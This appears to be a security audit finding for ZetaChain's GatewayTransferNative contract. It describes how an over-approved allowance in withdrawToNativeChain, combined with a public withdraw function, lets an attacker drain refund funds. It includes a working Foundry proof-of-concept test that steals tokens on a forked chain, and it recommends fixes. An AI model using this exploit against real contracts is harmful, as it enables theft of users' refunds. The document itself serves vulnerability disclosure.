# Over-approved allowance in `withdrawToNativeChain` leads to fund drainage via  `withdraw` public func

### Summary

The over approved allowance in `GatewayTransferNative:withdrawToNativeChain` and public `withdraw` function can be used by an attacker to steal funds left for refunds.

### Root Cause

When a user calls `GatewayTransferNative:withdrawToNativeChain`, the function approves an allowance of `outputAmount + gasFee` to **GatewayZEVM**. However, only `outputAmount - gasFee` is actually used in the withdrawal.

For example:
- If outputAmount = 100e18 and gasFee = 1e18 (1% of outputAmount)
- The approved allowance: 101e18
- The actual withdrawn amount: 99e18
- This leaves 1e18 (1e18 leftover allowance) unnecessarily approved.

After a withdrawal completes, the leftover approved allowance remains available. If the contract holds any funds (e.g., from failed transactions requiring refunds), an attacker can:

1. Call the public withdraw() function
2. Specify the same targetZRC20 token
3. Drain the leftover allowance amount

### External Pre-conditions

1. `GatewayTransferNative` must hold funds from aborted transactions that require refunds in the targetZRC20 token.
2. A legitimate user calls withdrawToNativeChain for the targetZRC20 token, leaving residual approved allowances due to over-approval.

### Attack Path

1. `GatewayTransferNative` must hold funds from aborted transactions that require refunds in the targetZRC20 token
2. A legitimate user calls withdrawToNativeChain for the targetZRC20 token, leaving residual approved allowances due to over-approval
3. The attacker calls the public withdraw function, specifying:
    - The same targetZRC20 token
    - A custom _externalId (constructed with their address)
    - Their address as the sender in both the _externalId and withdraw parameters

### Impact

Malicious actors can exploit the leftover allowance to steal refunds intended for legitimate users.

### PoC

Create a file named **AttackerPOC.t.sol** in the **test/** folder with the following code:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {AbortContext} from "@zetachain/protocol-contracts/contracts/zevm/interfaces/IGatewayZEVM.sol";

import {BaseTest} from "./BaseTest.t.sol";

/* forge test --fork-url https://zetachain-evm.blockpi.network/v1/rpc/public */
contract POC is BaseTest {

    // zetachain - Test native: _ETH_ADDRESS_ -> token1B
    function test_POC() public {
        // left over allowance is let by withdrawToNativeChain
        uint256 allowanceBefore = token1Z.allowance(address(gatewayTransferNative), address(gatewayZEVM));
        _withdrawToNativeChain();
        uint256 allowanceAfter = token1Z.allowance(address(gatewayTransferNative), address(gatewayZEVM));
        assertEq(allowanceBefore, 0);
        assertGt(allowanceAfter, allowanceBefore);

        // abort happens
        _simulateAbort();

        // attacker claims (steals) the funds using public withdraw func
        address attacker = makeAddr("attacker");
        uint256 attackerBalanceBefore = token1B.balanceOf(attacker);

        bytes32 _externalId = _calcExternalId(attacker);
        bytes memory sender = abi.encodePacked(attacker);
        gatewayTransferNative.withdraw(_externalId, sender, address(token1Z), 2e18);

        uint256 attackerBalanceAfter = token1B.balanceOf(attacker);

        assertEq(attackerBalanceBefore, 0);
        assertGt(attackerBalanceAfter, attackerBalanceBefore);
        assertEq(attackerBalanceAfter, 2e18);
    }

    function _withdrawToNativeChain() internal {
        uint256 amount = 100 ether;
        uint32 dstChainId = 2;
        address targetZRC20 = address(token1Z);
        bytes memory sender = abi.encodePacked(user1);
        bytes memory receiver = abi.encodePacked(user2);
        bytes memory swapDataZ = "";
        bytes memory contractAddress = abi.encodePacked(address(gatewaySendB));
        bytes memory fromTokenB = abi.encodePacked(address(token1B));
        bytes memory toTokenB = abi.encodePacked(address(token1B));
        bytes memory swapDataB = "";
        bytes memory accounts = "";
        bytes memory message = encodeMessage(
            dstChainId,
            targetZRC20,
            sender,
            receiver,
            swapDataZ,
            contractAddress,
            abi.encodePacked(
                fromTokenB, 
                toTokenB, 
                swapDataB
            ),
            accounts
        );

        vm.startPrank(user1);
        token1Z.approve(
            address(gatewayTransferNative),
            amount
        );
        gatewayTransferNative.withdrawToNativeChain(
            address(token1Z),
            amount,
            message
        );
        vm.stopPrank();
    }

    function _simulateAbort() internal {
        // simulating abort in the same way as `GatewayTransferNative.t.sol:test_ZOnAbort` did for test porpuses
        bytes32 externalId = keccak256(abi.encodePacked(block.timestamp));
        uint256 amount = 100 ether;
        token1Z.mint(address(gatewayTransferNative), amount);

        vm.prank(address(gatewayZEVM));
        gatewayTransferNative.onAbort(
            AbortContext({
                sender: abi.encode(address(this)),
                asset: address(token1Z),
                amount: amount,
                outgoing: false,
                chainID: 7000,
                revertMessage: bytes.concat(externalId, bytes20(user2))
            })
        );
    }

    function _calcExternalId(address sender) internal view returns (bytes32 externalId) {
        externalId = keccak256(abi.encodePacked(address(this), sender, gatewayTransferNative.globalNonce(), block.timestamp));
    }
}
```

### Mitigation

1. Approve only the outputAmount (not outputAmount + gasFee) for GatewayZEVM, since the gasFee is already deducted from the outputAmount during withdrawal.
2. Change the visibility of the withdraw function from public to internal to prevent unauthorized external calls.
